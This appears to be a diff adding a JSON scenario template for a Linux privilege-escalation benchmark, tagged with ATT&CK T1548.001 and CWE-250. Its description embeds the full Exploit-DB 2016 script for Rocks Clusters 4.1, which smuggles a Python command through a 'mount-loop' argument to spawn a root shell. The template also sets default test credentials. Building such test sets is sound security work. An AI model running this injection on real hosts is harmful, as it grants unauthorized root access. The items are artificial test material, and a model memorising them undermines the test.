@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_2016",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Rocks Clusters 4.1 - 'mount-loop' Local Privilege Escalation (OSVDB-27350;CVE-2006-3693)\n\nExploit source code (2016.sh):\n```\n#!/bin/sh\n##############################################################################\n##  rocksmountdirty.sh: Rocks release <=4.1 local root exploit\n##  make sure 'mount-loop' is in your path for this to work.\n##\n##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]\n##############################################################################\necho \"Rocks Clusters <=4.1 mount-loop local root exploit by xavier@tigerteam.se [http://xavsec.blogspot.com]\"\necho \"getting root.. goodluck\"\nmount-loop \"null\" \"null\" \"null; python -c 'import os;os.setuid(0);os.setgid(0);os.execl(\\\"/bin/sh\\\", \\\"/usr/sbin/httpd\\\")'\"\n\n# milw0rm.com [2006-07-15]\n```",
+  "cve": "OSVDB-27350;CVE-2006-3693",
+  "exploitdb_id": "2016",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_2016",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
